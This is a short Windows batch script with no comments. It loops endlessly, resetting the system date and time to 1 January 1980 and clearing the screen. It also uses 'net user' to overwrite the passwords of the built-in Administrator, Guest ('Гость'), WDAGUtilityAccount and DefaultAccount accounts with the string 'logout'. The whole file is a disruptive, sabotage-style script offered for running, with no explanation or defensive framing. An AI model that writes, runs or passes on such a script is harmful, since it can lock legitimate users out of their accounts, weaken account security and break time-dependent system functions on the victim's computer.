@echo off
:looper
timeout 0 && timeout 0 & cls & cls & cls && cls && date 01-01-1980 && cls && cls & cls & cls & cls & cls && cls && time 00:00 && cls && cls & cls
net user Administrator logout
net user Гость logout
net user WDAGUtilityAccount logout
net user DefaultAccount logout
cls
goto looper